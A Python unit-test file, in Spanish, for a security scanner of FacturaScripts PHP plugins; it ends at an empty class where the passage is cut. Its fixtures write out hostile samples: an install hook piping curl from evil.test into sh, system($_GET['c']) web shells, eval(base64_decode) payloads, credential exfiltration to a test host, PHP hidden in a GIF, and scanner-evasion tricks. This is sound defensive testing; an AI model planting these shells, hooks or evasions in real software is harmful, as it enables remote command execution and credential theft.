"""Pruebas del auditor de seguridad de plugins de FacturaScripts."""

from __future__ import annotations

import importlib.util
import io
import json
import os
import subprocess
import sys
import tempfile
import unittest
import unittest.mock
from contextlib import redirect_stdout
from pathlib import Path


SCRIPT_PATH = Path(__file__).parents[1] / 'scripts' / 'check-security.py'
SPEC = importlib.util.spec_from_file_location('check_security', SCRIPT_PATH)
assert SPEC is not None and SPEC.loader is not None
CHECKER = importlib.util.module_from_spec(SPEC)
sys.modules[SPEC.name] = CHECKER
SPEC.loader.exec_module(CHECKER)


def build_plugin(root: Path, files: dict[str, str]) -> Path:
    """Crea un plugin de prueba con su ini y los archivos indicados."""
    plugin = root / 'MiPlugin'
    plugin.mkdir(parents=True, exist_ok=True)
    (plugin / 'facturascripts.ini').write_text("name = 'MiPlugin'\nversion = 1.0\nmin_version = 2025\n")
    for relative, content in files.items():
        path = plugin / relative
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(content)
    return plugin


def php_class(name: str, body: str, namespace: str = 'FacturaScripts\\Plugins\\MiPlugin\\Lib') -> str:
    """Envuelve el cuerpo de un método en una clase PHP mínima."""
    return (f'<?php\nnamespace {namespace};\n\nclass {name}\n{{\n'
            f'    public function run()\n    {{\n{body}\n    }}\n}}\n')


class SecurityAuditTest(unittest.TestCase):
    """Comprueba la detección, el contexto y el filtrado del auditor de seguridad."""

    def setUp(self) -> None:
        """Prepara un directorio temporal para cada prueba."""
        self.tmp = tempfile.TemporaryDirectory()
        self.root = Path(self.tmp.name)

    def tearDown(self) -> None:
        """Elimina el directorio temporal."""
        self.tmp.cleanup()

    def audit(self, files: dict[str, str], **kwargs) -> dict:
        """Audita un plugin construido con los archivos indicados."""
        return CHECKER.audit(build_plugin(self.root, files), **kwargs)

    @staticmethod
    def titles(report: dict, category: str | None = None) -> list[str]:
        """Devuelve los títulos de los hallazgos, opcionalmente de una categoría."""
        return [item['titulo'] for item in report['hallazgos']
                if category is None or item['categoria'] == category]

    @staticmethod
    def find(report: dict, category: str) -> list[dict]:
        """Devuelve los hallazgos de una categoría."""
        return [item for item in report['hallazgos'] if item['categoria'] == category]

    def test_detecta_exec_en_init_update_con_su_contexto(self) -> None:
        """Un exec en Init::update() se ejecuta al instalar y así debe indicarse."""
        init = ('<?php\nnamespace FacturaScripts\\Plugins\\MiPlugin;\n\nclass Init\n{\n'
                '    public function init(): void\n    {\n    }\n\n'
                '    public function update(): void\n    {\n'
                '        exec("curl http://evil.test/x.sh | sh");\n    }\n}\n')
        report = self.audit({'Init.php': init})

        findings = self.find(report, 'ejecucion-comandos')
        self.assertEqual(len(findings), 1)
        self.assertEqual(findings[0]['severidad'], 'alta')
        self.assertEqual(findings[0]['linea'], 12)
        self.assertIn('al instalar o actualizar', findings[0]['contexto'])
        self.assertTrue(report['requiere_revision'])

    def test_ignora_metodos_definiciones_cadenas_y_comentarios(self) -> None:
        """Un método llamado exec, un texto o un comentario no ejecutan comandos."""
        body = ('        // exec("rm -rf /");\n'
                '        /* system("id"); */\n'
                "        $label = 'exec(algo) y system(otro)';\n"
                '        $this->exec($label);\n'
                '        Worker::exec();\n'
                '        $sql = "EXEC(procedimiento)";\n')
        code = php_class('Uno', body).replace('    }\n}\n', '    }\n\n    public function exec() {}\n}\n')
        report = self.audit({'Lib/Uno.php': code})
        self.assertEqual(self.find(report, 'ejecucion-comandos'), [])
        self.assertEqual(self.find(report, 'codigo-dinamico'), [])

    def test_comillas_invertidas_ejecutan_comandos(self) -> None:
        """En PHP las comillas invertidas lanzan un comando de shell."""
        report = self.audit({'Lib/Dos.php': php_class('Dos', '        $out = `whoami`;')})
        self.assertIn('Ejecuta un comando con comillas invertidas', self.titles(report, 'ejecucion-comandos'))

    def test_anota_comando_fijo_y_comando_sin_escapar(self) -> None:
        """Distingue un comando literal de uno construido con variables sin escapar."""
        body = ("        exec('openssl version', $out, $code);\n"
                "        $cmd = 'convert ' . $file;\n"
                '        exec($cmd, $out);\n')
        report = self.audit({'Lib/Tres.php': php_class('Tres', body)})
        notes = [note for item in self.find(report, 'ejecucion-comandos') for note in item['notas']]
        self.assertIn("comando fijo: 'openssl version'", notes)
        self.assertIn('el comando está en la variable $cmd', notes)
        self.assertTrue(any(note.startswith('no escapa los argumentos') for note in notes))

    def test_eval_de_contenido_decodificado_es_alta(self) -> None:
        """eval(base64_decode(...)) es el patrón clásico de código ofuscado."""
        report = self.audit({'Lib/Cuatro.php': php_class('Cuatro', "        eval(base64_decode('ZWNobyAxOw=='));")})
        dynamic = self.find(report, 'codigo-dinamico')
        self.assertEqual(dynamic[0]['severidad'], 'alta')
        self.assertTrue(any('decodificado' in note for note in dynamic[0]['notas']))
        decoded = self.find(report, 'ofuscacion')
        self.assertEqual(decoded[0]['severidad'], 'alta')

    def test_base64_aislado_es_baja(self) -> None:
        """Decodificar un adjunto o una firma es habitual y no debe alarmar."""
        report = self.audit({'Lib/Cinco.php': php_class('Cinco', '        $pdf = base64_decode($this->body);')})
        self.assertEqual([item['severidad'] for item in self.find(report, 'ofuscacion')], ['baja'])
        self.assertFalse(report['requiere_revision'])

    def test_correlaciona_credenciales_y_red_como_exfiltracion(self) -> None:
        """Leer la contraseña de la base de datos y abrir una conexión en el mismo archivo."""
        body = ("        $data = ['pass' => FS_DB_PASS, 'host' => FS_DB_HOST];\n"
                "        Http::post('https://recolector.test/api', $data);\n")
        report = self.audit({'Lib/Seis.php': php_class('Seis', body)})
        exfil = self.find(report, 'posible-exfiltracion')
        self.assertEqual(len(exfil), 1)
        self.assertEqual(exfil[0]['severidad'], 'alta')
        network = self.find(report, 'red-saliente')
        self.assertIn('destino: recolector.test', network[0]['notas'])
        self.assertEqual(report['dominios'][0]['dominio'], 'recolector.test')
        self.assertIn('llamada', report['dominios'][0]['usos'])

    def test_resuelve_destino_de_variables_y_constantes(self) -> None:
        """El destino se resuelve cuando la URL está en una variable o una constante."""
        code = ('<?php\nnamespace FacturaScripts\\Plugins\\MiPlugin\\Lib;\n\nclass Siete\n{\n'
                "    const API_URL = 'https://api.proveedor.test/v1';\n\n"
                '    public function run()\n    {\n'
                '        $ch = curl_init();\n'
                '        curl_setopt($ch, CURLOPT_URL, self::API_URL);\n'
                "        $url = 'https://otro.test/datos';\n"
                '        $raw = file_get_contents($url);\n'
                '    }\n}\n')
        report = self.audit({'Lib/Siete.php': code})
        notes = [note for item in self.find(report, 'red-saliente') for note in item['notas']]
        self.assertIn('destino: api.proveedor.test', notes)
        self.assertIn('destino: otro.test (asignado a $url)', notes)

    def test_lectura_de_archivo_local_no_es_red(self) -> None:
        """file_get_contents de una ruta local no es una conexión de red."""
        body = "        $json = file_get_contents(__DIR__ . '/data.json');\n        $x = file_get_contents($path);"
        report = self.audit({'Lib/Ocho.php': php_class('Ocho', body)})
        self.assertEqual(self.find(report, 'red-saliente'), [])

    def test_javascript_solo_senala_peticiones_a_dominios_externos(self) -> None:
        """Las peticiones relativas van a la propia instalación y no se señalan."""
        js = ("fetch('EditCliente?action=x');\n"
              "fetch(`${base}/api`);\n"
              "$.ajax({url: 'ListProducto'});\n"
              "// fetch('https://comentario.test');\n"
              "fetch('https://analitica.test/collect', {method: 'POST'});\n"
              "navigator.sendBeacon('/x', data);\n")
        report = self.audit({'Assets/JS/app.js': js})
        findings = self.find(report, 'red-saliente')
        self.assertEqual([item['linea'] for item in findings], [5, 6])
        self.assertEqual(findings[0]['contexto'], 'navegador del usuario')
        self.assertNotIn('comentario.test', [item['dominio'] for item in report['dominios']])

    def test_script_externo_en_twig_indica_si_tiene_sri(self) -> None:
        """Un script de un CDN se señala e indica si protege su integridad."""
        twig = ('{# <script src="https://oculto.test/x.js"></script> #}\n'
                '<script src="https://cdn.test/lib.js" integrity="sha384-abc" crossorigin="anonymous"></script>\n'
                '<script src="https://cdn.test/otra.js"></script>\n'
                '<a href="https://ayuda.test/doc">ayuda</a>\n')
        report = self.audit({'View/Mi.html.twig': twig})
        scripts = self.find(report, 'recurso-externo')
        self.assertEqual([item['linea'] for item in scripts], [2, 3])
        self.assertIn('declara integrity (SRI)', scripts[0]['notas'])
        self.assertTrue(any(note.startswith('sin integrity') for note in scripts[1]['notas']))
        domains = {item['dominio']: item['usos'] for item in report['dominios']}
        self.assertEqual(domains['cdn.test'], ['script'])
        self.assertEqual(domains['ayuda.test'], ['referencia'])
        self.assertNotIn('oculto.test', domains)

    def test_escritura_de_php_y_config_es_alta(self) -> None:
        """Escribir archivos PHP o config.php modifica la instalación."""
        body = ("        file_put_contents(FS_FOLDER . '/Core/puerta.php', $code);\n"
                "        file_put_contents(FS_FOLDER . '/MyFiles/informe.csv', $csv);\n")
        report = self.audit({'Lib/Nueve.php': php_class('Nueve', body)})
        findings = self.find(report, 'modificacion-instalacion')
        self.assertEqual(len(findings), 1)
        self.assertEqual(findings[0]['linea'], 8)

    def test_controlador_publico_y_privilegios(self) -> None:
        """Señala los controladores sin login y la concesión de privilegios."""
        controller = ('<?php\nnamespace FacturaScripts\\Plugins\\MiPlugin\\Controller;\n\n'
                      'class Webhook extends Controller\n{\n'
                      '    public function publicCore(&$response)\n    {\n'
                      '        $user->admin = true;\n'
                      '        $user->setPassword($this->request->get("p"));\n'
                      '    }\n}\n')
        report = self.audit({'Controller/Webhook.php': controller})
        self.assertIn('Controlador que no exige iniciar sesión', self.titles(report, 'acceso-publico'))
        privileges = self.find(report, 'privilegios')
        self.assertEqual(len(privileges), 2)
        self.assertEqual(privileges[0]['contexto'], 'controlador accesible sin autenticación')

    def test_php_en_assets_y_ejecutables(self) -> None:
        """Un PHP en Assets/ se publica en Dinamic/Assets y puede ejecutarse directamente."""
        report = self.audit({
            'Assets/shell.php': '<?php echo 1;',
            'bin/instalar.sh': '#!/bin/sh\necho hola\n',
            '.htaccess': 'Allow from all\n',
            'composer.json': json.dumps({'scripts': {'post-install-cmd': 'php x.php'}}),
        })
        structure = {item['titulo']: item['severidad'] for item in self.find(report, 'estructura')}
        self.assertEqual(structure['Archivo PHP dentro de Assets/'], 'alta')
        self.assertEqual(structure['Incluye un ejecutable o un script ajeno a PHP'], 'media')
        self.assertEqual(structure['Incluye configuración del servidor web o de PHP'], 'media')
        self.assertEqual(structure['composer.json declara scripts'], 'media')

    def test_script_cli_rebaja_severidad(self) -> None:
        """Un script que aborta fuera de php-cli no puede lanzarse desde el navegador."""
        updater = ('<?php\nif (php_sapi_name() !== "cli") {\n    die("usa la consola");\n}\n'
                   '$url = "https://facturascripts.com/EditLanguage?code=es";\n'
                   '$data = file_get_contents($url);\nunlink("es_ES.json");\n')
        suelto = '<?php\n$data = file_get_contents("https://terceros.test/x");\n'
        report = self.audit({'Translation/updater.php': updater, 'tools/suelto.php': suelto})

        network = {item['archivo']: item for item in self.find(report, 'red-saliente')}
        self.assertEqual(network['Translation/updater.php']['severidad'], 'baja')
        self.assertIn('línea de comandos', network['Translation/updater.php']['contexto'])
        self.assertEqual(network['tools/suelto.php']['severidad'], 'media')
        self.assertIn('script suelto', network['tools/suelto.php']['contexto'])

    def test_excluye_tests_y_vendor_salvo_que_se_pidan(self) -> None:
        """Test/ y vendor/ no se analizan por defecto, pero vendor/ se declara en las limitaciones."""
        files = {
            'Test/main/UnoTest.php': php_class('UnoTest', "        exec('id');"),
            'vendor/lib/Cliente.php': php_class('Cliente', "        exec('id');"),
        }
        report = self.audit(files)
        self.assertEqual(self.find(report, 'ejecucion-comandos'), [])
        self.assertTrue(any('vendor/' in item for item in report['limitaciones']))

        report = self.audit(files, include_tests=True, include_vendor=True)
        contexts = sorted(item['contexto'] for item in self.find(report, 'ejecucion-comandos'))
        self.assertEqual(len(contexts), 2)
        self.assertIn('tests (no se ejecuta en producción)', contexts)
        severities = {item['archivo']: item['severidad'] for item in self.find(report, 'ejecucion-comandos')}
        self.assertEqual(severities['Test/main/UnoTest.php'], 'media')

    def test_ignora_claves_de_array_sql_y_clases_css(self) -> None:
        """'CREATE USER' como clave de un array o una clase CSS no son sentencias SQL."""
        body = ("        $patrones = ['CREATE USER' => '/x/', 'DROP TABLE' => '/y/'];\n"
                "        $html = '<span class=\"pc-truncate\">';\n"
                "        $this->db()->exec('DROP TABLE antigua');\n")
        report = self.audit({'Lib/Diez.php': php_class('Diez', body)})
        findings = self.find(report, 'sql-destructivo')
        self.assertEqual([(item['severidad'], item['linea']) for item in findings], [('baja', 10)])

    def test_credenciales_embebidas(self) -> None:
        """Una clave real en el código se señala; una clave de traducción o una URL no."""
        body = ("        $config = ['Password' => 're_dySxAHw9_4gURo2KLWk'];\n"
                "        $label = ['password' => 'user-password-label'];\n"
                "        $token = 'https://api.test/oauth2/token';\n")
        report = self.audit({'Lib/Once.php': php_class('Once', body)})
        findings = self.find(report, 'credenciales-embebidas')
        self.assertEqual([item['linea'] for item in findings], [8])

    def test_plugin_limpio_sale_con_cero(self) -> None:
        """Un plugin sin comportamientos sensibles devuelve 0 y lo indica."""
        plugin = build_plugin(self.root, {'Lib/Limpio.php': php_class('Limpio', '        return 1;')})
        output = io.StringIO()
        with redirect_stdout(output):
            code = CHECKER.main([str(plugin)])
        self.assertEqual(code, 0)
        self.assertIn('SIN HALLAZGOS RELEVANTES', output.getvalue())

    def test_salida_json_y_codigos_de_error(self) -> None:
        """Con hallazgos devuelve 1, y 2 si la ruta no existe."""
        plugin = build_plugin(self.root, {'Lib/Doce.php': php_class('Doce', "        shell_exec('id');")})
        output = io.StringIO()
        with redirect_stdout(output):
            code = CHECKER.main([str(plugin), '--json', '--min-severity', 'alta'])
        self.assertEqual(code, 1)
        data = json.loads(output.getvalue())
        self.assertEqual(data['resumen']['alta'], 1)
        self.assertTrue(all(item['severidad'] == 'alta' for item in data['hallazgos']))

        with redirect_stdout(io.StringIO()), unittest.mock.patch('sys.stderr', io.StringIO()):
            self.assertEqual(CHECKER.main([str(self.root / 'no-existe')]), 2)

    def test_versiones_sin_comentarios_conservan_posiciones(self) -> None:
        """Las versiones depuradas deben tener la misma longitud y líneas que el original."""
        php = "<?php\n# comentario\n#[Attr]\n$a = 'x // y'; /* b\n c */ $b = <<<EOT\nhola\nEOT;\n"
        text, code = CHECKER.strip_php(php)
        self.assertEqual(len(text), len(php))
        self.assertEqual(len(code), len(php))
        self.assertEqual(text.count('\n'), php.count('\n'))
        self.assertIn('#[Attr]', code)
        self.assertNotIn('comentario', text)
        self.assertIn("'x // y'", text)
        self.assertNotIn('hola', code)

        js = "const r = /'/g; // nota\nconst s = 'a'; fetch(`x`);\n"
        text, code = CHECKER.strip_js(js)
        self.assertEqual(len(code), len(js))
        self.assertNotIn('nota', text)
        self.assertIn('fetch(', code)


class EvasionTest(unittest.TestCase):
    """Comprueba las formas de ejecutar código que evitan los patrones directos."""

    def setUp(self) -> None:
        """Prepara un directorio temporal para cada prueba."""
        self.tmp = tempfile.TemporaryDirectory()
        self.root = Path(self.tmp.name)

    def tearDown(self) -> None:
        """Elimina el directorio temporal."""
        self.tmp.cleanup()

    def audit(self, files: dict[str, str], **kwargs) -> dict:
        """Audita un plugin construido con los archivos indicados."""
        return CHECKER.audit(build_plugin(self.root, files), **kwargs)

    @staticmethod
    def by_title(report: dict) -> dict[str, list[dict]]:
        """Agrupa los hallazgos por título."""
        grouped: dict[str, list[dict]] = {}
        for item in report['hallazgos']:
            grouped.setdefault(item['titulo'], []).append(item)
        return grouped

    def test_extensiones_php_alternativas_se_analizan(self) -> None:
        """.phtml, .inc, .php5, .php7 y .pht se analizan como PHP."""
        files = {f'Lib/x{suffix}': "<?php exec($_GET['c']);" for suffix in ('.phtml', '.inc', '.php5', '.php7', '.pht')}
        report = self.audit(files)

        analysed = {item['archivo'] for item in report['hallazgos'] if item['categoria'] == 'ejecucion-comandos'}
        self.assertEqual(set(files), analysed)
        self.assertEqual(5, report['analizados']['por_lenguaje']['php'])

    def test_ejecutables_en_assets_son_alta(self) -> None:
        """Cualquier PHP o ejecutable dentro de Assets/ tiene gravedad alta."""
        report = self.audit({
            'Assets/shell.phtml': '<?php echo 1;',
            'Assets/js/run.sh': 'echo hola\n',
            'Assets/js/app.js': 'console.log(1);\n',
        })
        structure = {item['archivo']: item for item in report['hallazgos'] if item['categoria'] == 'estructura'
                     and 'Assets/' in item['titulo']}

        self.assertEqual('alta', structure['Assets/shell.phtml']['severidad'])
        self.assertEqual('alta', structure['Assets/js/run.sh']['severidad'])
        self.assertNotIn('Assets/js/app.js', structure)

    def test_callbacks_peligrosos(self) -> None:
        """call_user_func, array_map o usort con una función peligrosa como literal son alta."""
        body = ("        call_user_func('system', $_GET['c']);\n"
                "        array_map('\\\\passthru', [$_GET['c']]);\n"
                "        usort($filas, 'strcmp');\n"
                "        array_map(fn($fila) => $fila, $filas);\n")
        report = self.audit({'Lib/Uno.php': php_class('Uno', body)})

        findings = self.by_title(report)['Pasa una función que ejecuta comandos o código como callback']
        self.assertEqual([(8, 'alta'), (9, 'alta')], [(item['linea'], item['severidad']) for item in findings])
        self.assertIn('callback: passthru', findings[1]['notas'])

    def test_llamadas_a_funcion_variable(self) -> None:
        """$f(...) es alta si $f nombra una función peligrosa y se ignora si es una closure."""
        body = ("        $f = 'shell_' . 'exec';\n        $f($_GET['c']);\n"
                "        $g = function ($x) { return $x; };\n        $g(1);\n"
                "        $callback(2);\n"
                "        $obj = new $clase();\n")
        report = self.audit({'Lib/Dos.php': php_class('Dos', body)})

        findings = self.by_title(report)['Llama a una función cuyo nombre está en una variable']
        self.assertEqual([(9, 'alta'), (12, 'baja')], [(item['linea'], item['severidad']) for item in findings])
        self.assertIn('$f contiene el nombre de la función shell_exec', findings[0]['notas'])

    def test_include_con_directorio_fijo_y_variable(self) -> None:
        """__DIR__ seguido de una variable se señala; __DIR__ con un literal no."""
        body = ("        require_once __DIR__ . '/vendor/autoload.php';\n"
                "        require __DIR__ . '/../' . $_GET['pagina'];\n")
        report = self.audit({'Lib/Tres.php': php_class('Tres', body)})

        findings = self.by_title(report)['Incluye un archivo PHP calculado en tiempo de ejecución']
        self.assertEqual([9], [item['linea'] for item in findings])
        self.assertIn('la ruta parte de un directorio fijo pero concatena una variable', findings[0]['notas'])

    def test_tests_anidados_se_excluyen(self) -> None:
        """Un directorio tests/ dentro de Lib/ también se excluye salvo que se pida."""
        files = {'Lib/tests/UnoTest.php': php_class('UnoTest', "        exec('id');")}

        self.assertEqual([], self.audit(files)['hallazgos'])
        self.assertTrue(self.audit(files, include_tests=True)['hallazgos'])

    def test_error_inesperado_sale_con_dos(self) -> None:
        """Una excepción durante el análisis devuelve 2, no 1."""
        plugin = build_plugin(self.root, {'Lib/Cuatro.php': php_class('Cuatro', '        return 1;')})
        stderr = io.StringIO()
        with unittest.mock.patch.object(CHECKER, 'audit', side_effect=RuntimeError('fallo')), \
                redirect_stdout(io.StringIO()), unittest.mock.patch('sys.stderr', stderr):
            code = CHECKER.main([str(plugin)])

        self.assertEqual(2, code)
        self.assertIn('fallo', stderr.getvalue())

    def run_main(self, plugin: Path) -> tuple[int, str]:
        """Ejecuta el script sobre un plugin y devuelve su código de salida y su salida."""
        output = io.StringIO()
        with redirect_stdout(output):
            code = CHECKER.main([str(plugin)])
        return code, output.getvalue()

    def assert_ejecuta_comandos(self, report: dict) -> None:
        """El informe señala la ejecución de comandos como alta y pide revisión."""
        findings = [item for item in report['hallazgos'] if item['categoria'] == 'ejecucion-comandos']
        self.assertTrue(findings)
        self.assertEqual('alta', findings[0]['severidad'])
        self.assertTrue(report['requiere_revision'])

    def test_cierre_de_php_termina_el_comentario_de_linea(self) -> None:
        """En PHP, ?> cierra un comentario // y lo que le sigue en la línea se ejecuta."""
        init = ('<?php\nnamespace FacturaScripts\\Plugins\\MiPlugin;\n'
                "// nota ?><?php system($_GET['c']);\n")
        self.assert_ejecuta_comandos(self.audit({'Init.php': init}))

    def test_apostrofos_del_html_no_abren_cadenas_de_php(self) -> None:
        """El HTML entre islas de PHP no es PHP: un apóstrofo ahí no oculta el código siguiente."""
        body = "        ?><p>It's</p><?php system($_GET['c']) ?><p>Don't</p><?php"
        self.assert_ejecuta_comandos(self.audit({'Lib/Plantilla.php': php_class('Plantilla', body)}))

    def test_html_antes_de_la_primera_isla_no_es_php(self) -> None:
        """Un archivo puede empezar en HTML: su apóstrofo no se traga la isla de PHP que sigue."""
        template = "<p>It's</p>\n<?php system($_GET['c']); ?>\n<p>Don't</p>\n"
        self.assert_ejecuta_comandos(self.audit({'View/Plantilla.php': template}))

    def test_el_html_conserva_sus_urls(self) -> None:
        """El HTML de un archivo PHP no se analiza como código, pero sus URL siguen en el inventario."""
        template = '<?php $titulo = 1; ?>\n<script src="https://cdn.terceros.test/lib.js"></script>\n'
        report = self.audit({'View/Pagina.php': template})
        self.assertIn('cdn.terceros.test', [item['dominio'] for item in report['dominios']])

    def test_inc_incluido_desde_init_se_analiza(self) -> None:
        """Un .inc incluido con __DIR__ se analiza como PHP."""
        init = ('<?php\nnamespace FacturaScripts\\Plugins\\MiPlugin;\n\nclass Init\n{\n'
                '    public function init(): void\n    {\n'
                "        require_once __DIR__ . '/Lib/helper.inc';\n    }\n}\n")
        report = self.audit({'Init.php': init, 'Lib/helper.inc': "<?php\nsystem($_GET['c']);\n"})
        self.assert_ejecuta_comandos(report)

    def test_php_en_node_modules_se_analiza(self) -> None:
        """node_modules/ se sirve directamente: su PHP se analiza y el resto se declara sin analizar."""
        report = self.audit({
            'node_modules/x/i.php': "<?php\nsystem($_GET['c']);\n",
            'node_modules/x/index.js': 'module.exports = 1;\n',
        })
        self.assert_ejecuta_comandos(report)
        self.assertEqual(1, report['analizados']['sin_analizar'])
        self.assertTrue(any('node_modules/ incluye 1 archivos' in item for item in report['limitaciones']))

    def test_extension_desconocida_con_php_se_analiza(self) -> None:
        """Un archivo con otra extensión que contiene PHP se analiza, porque un include lo ejecuta."""
        report = self.audit({'Lib/datos.txt': "<?php\nsystem($_GET['c']);\n"})
        self.assert_ejecuta_comandos(report)

    def test_js_que_cita_php_se_analiza_como_js(self) -> None:
        """Un .js que menciona <?php en un comentario sigue siendo JS: sus plantillas no son comandos."""
        script = '// processing instruction, e.g. <?php ?>\nconst a = `uno ${1}`;\n'
        report = self.audit({'node_modules/lib/rules.js': script, 'Assets/JS/propio.js': script})
        self.assertEqual([], [item for item in report['hallazgos'] if item['categoria'] == 'ejecucion-comandos'])
        self.assertTrue(any('node_modules/ incluye 1 archivos' in item for item in report['limitaciones']),
                        'el JS de node_modules/ no se analiza')
        self.assertIn('Assets/JS/propio.js contiene <?php y no se ha analizado como PHP.', report['limitaciones'])

    def test_js_con_php_incluido_se_declara_no_analizado(self) -> None:
        """Un .js, .html o .twig con PHP se ejecuta como PHP si se incluye: si no se analiza así, se dice."""
        init = ('<?php\nnamespace FacturaScripts\\Plugins\\MiPlugin;\n\nclass Init\n{\n'
                '    public function init(): void\n    {\n'
                "        require_once __DIR__ . '/Lib/a.js';\n    }\n}\n")
        payload = "<?php system($_GET['c']);\n"
        plugin = build_plugin(self.root, {'Init.php': init, 'Lib/a.js': payload,
                                          'View/b.html': payload, 'View/c.twig': payload})

        report = CHECKER.audit(plugin)
        for relative in ('Lib/a.js', 'View/b.html', 'View/c.twig'):
            self.assertIn(f'{relative} contiene <?php y no se ha analizado como PHP.', report['limitaciones'])
        self.assertEqual(3, report['analizados']['sin_analizar'])
        self.assertIn(INCLUDE_TITLE, [item['titulo'] for item in report['hallazgos']])
        code, _output = self.run_main(plugin)
        self.assertEqual(1, code, 'el include del .js lo señala')

    def test_lo_no_analizado_se_declara_y_cambia_el_veredicto(self) -> None:
        """Un directorio enlazado no se sigue, y el veredicto no afirma que el plugin esté limpio."""
        outside = self.root / 'fuera'
        outside.mkdir()
        (outside / 'x.php').write_text("<?php\nsystem($_GET['c']);\n")
        plugin = build_plugin(self.root, {'Lib/Limpio.php': php_class('Limpio', '        return 1;')})
        (plugin / 'Externo').symlink_to(outside, target_is_directory=True)

        report = CHECKER.audit(plugin)
        self.assertEqual(1, report['analizados']['sin_analizar'])
        self.assertTrue(any(item.startswith('Externo/ es un enlace a un directorio') for item in report['limitaciones']))

        code, output = self.run_main(plugin)
        self.assertEqual(0, code)
        self.assertIn('SIN HALLAZGOS EN LO ANALIZADO: quedan 1 archivos o directorios sin analizar', output)
        self.assertNotIn('SIN HALLAZGOS RELEVANTES', output)

    def test_archivo_enlazado_se_analiza_y_se_declara(self) -> None:
        """Un archivo enlazado se analiza, y el informe dice adónde apunta."""
        outside = self.root / 'fuera.php'
        outside.write_text("<?php\nsystem($_GET['c']);\n")
        plugin = build_plugin(self.root, {})
        (plugin / 'Enlace.php').symlink_to(outside)

        report = CHECKER.audit(plugin)
        self.assert_ejecuta_comandos(report)
        self.assertTrue(any(item.startswith(f'Enlace.php -> {outside}') for item in report['limitaciones']))

    def assert_limpio(self, plugin: Path) -> None:
        """El script sale con 0 y afirma que no hay hallazgos relevantes."""
        code, output = self.run_main(plugin)
        self.assertEqual(0, code, output)
        self.assertIn('SIN HALLAZGOS RELEVANTES', output)

    def test_workflow_de_github_no_se_analiza_como_php(self) -> None:
        """El tests.yml habitual de un plugin genera un config.php en un heredoc: no es PHP del plugin."""
        workflow = (
            'name: Tests\non: [push]\njobs:\n  tests:\n    runs-on: ubuntu-latest\n    steps:\n'
            '      - name: Create application config\n        run: |\n'
            "          cat > config.php << 'EOF'\n          <?php\n"
            "          define('FS_DB_TYPE', 'mysql');\n          define('FS_DB_USER', 'root');\n"
            "          define('FS_DB_PASS', '${{ env.DB_PASS }}');\n          EOF\n"
            '      - run: vendor/bin/phpunit `pwd`/Test\n'
        )
        plugin = build_plugin(self.root, {'.github/workflows/tests.yml': workflow})
        self.assertEqual([], CHECKER.audit(plugin)['hallazgos'])
        self.assert_limpio(plugin)

    def test_markdown_con_ejemplos_de_php_no_se_analiza_como_php(self) -> None:
        """Un README con un bloque de PHP documenta, no ejecuta: ni su exec ni sus vallas son hallazgos."""
        readme = '# MiPlugin\n\nEjemplo:\n\n```php\n<?php\nexec("ls");\n```\n'
        plugin = build_plugin(self.root, {'README.md': readme, 'Doc/Dev/uso.md': readme})
        self.assertEqual([], CHECKER.audit(plugin)['hallazgos'])
        self.assert_limpio(plugin)

    def test_markdown_que_empieza_por_php_se_analiza(self) -> None:
        """Un .md que empieza por <?php está hecho para incluirse: se sigue analizando como PHP."""
        self.assert_ejecuta_comandos(self.audit({'Doc/datos.md': "<?php\nsystem($_GET['c']);\n"}))

    def test_texto_con_php_a_mitad_se_sigue_analizando(self) -> None:
        """En un archivo de texto de extensión desconocida, el PHP a mitad de archivo también se ejecuta."""
        self.assert_ejecuta_comandos(self.audit({'Lib/datos.txt': "cabecera\n<?php system($_GET['c']);\n"}))

    def test_imagen_con_etiqueta_corta_no_se_analiza_como_php(self) -> None:
        """Los bytes <?= salen por azar en una imagen: no es PHP y no se analiza como tal."""
        plugin = build_plugin(self.root, {})
        (plugin / 'Assets/Images').mkdir(parents=True)
        (plugin / 'Assets/Images/logo.png').write_bytes(
            b'\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR' + b'<?= `x` ' * 200 + b'\x00IEND')
        (plugin / 'Assets/Images/logo.webp').write_bytes(b'RIFF\x00\x00WEBP' + b'<?=`' * 50)
        (plugin / 'Doc/manual.pdf').parent.mkdir()
        (plugin / 'Doc/manual.pdf').write_bytes(b'%PDF-1.4\n<?= `x` \n' * 50)
        report = CHECKER.audit(plugin)
        self.assertEqual([], report['hallazgos'])
        self.assertEqual(0, report['analizados']['sin_analizar'])
        self.assert_limpio(plugin)

    def test_binario_con_php_completo_se_declara(self) -> None:
        """Una imagen que contiene <?php no se analiza, pero un include la ejecutaría: se dice."""
        plugin = build_plugin(self.root, {})
        (plugin / 'Assets').mkdir()
        (plugin / 'Assets/x.gif').write_bytes(b'GIF89a\x00\x00<?php system($_GET["c"]); ?>')
        report = CHECKER.audit(plugin)
        self.assertIn('Assets/x.gif es binario y contiene <?php: no se ha analizado como PHP.',
                      report['limitaciones'])
        self.assertEqual(1, report['analizados']['sin_analizar'])

    def test_git_no_cuenta_como_sin_analizar(self) -> None:
        """.git no contiene PHP que el servidor ejecute: un plugin clonado puede salir limpio."""
        plugin = build_plugin(self.root, {'Lib/Limpio.php': php_class('Limpio', '        return 1;'),
                                          '.git/config': '[core]\n', '.git/HEAD': 'ref: refs/heads/main\n'})
        report = CHECKER.audit(plugin)
        self.assertEqual(0, report['analizados']['sin_analizar'])
        self.assertFalse(any('.git' in item for item in report['limitaciones']))
        self.assert_limpio(plugin)

    def test_git_no_se_recorre(self) -> None:
        """Lo que hay dentro de .git no se analiza como código: no da hallazgos."""
        report = self.audit({'.git/hooks/post-checkout.php': "<?php\nsystem($_GET['c']);\n"})
        self.assertEqual(1, report['analizados']['archivos'], 'solo facturascripts.ini')
        self.assertEqual([], report['hallazgos'])

    def test_github_no_excluye_otras_extensiones(self) -> None:
        """La regla de la documentación va por extensión: un .txt de .github/ con PHP a mitad se analiza."""
        self.assert_ejecuta_comandos(self.audit({'.github/notas.txt': "texto\n<?php system($_GET['c']);\n"}))


INCLUDE_TITLE = 'Incluye un archivo que puede no ser PHP'


def init_con(statement: str) -> str:
    """Un Init.php cuyo init() ejecuta la sentencia indicada."""
    return ('<?php\nnamespace FacturaScripts\\Plugins\\MiPlugin;\n\nclass Init\n{\n'
            '    public function init(): void\n    {\n'
            f'        {statement}\n    }}\n}}\n')


def init_que_incluye(relative: str) -> str:
    """Un Init.php que incluye un archivo del plugin por ruta fija."""
    return ('<?php\nnamespace FacturaScripts\\Plugins\\MiPlugin;\n\nclass Init\n{\n'
            '    public function init(): void\n    {\n'
            f"        require_once __DIR__ . '/{relative}';\n    }}\n}}\n")


class IncludeNoPhpTest(unittest.TestCase):
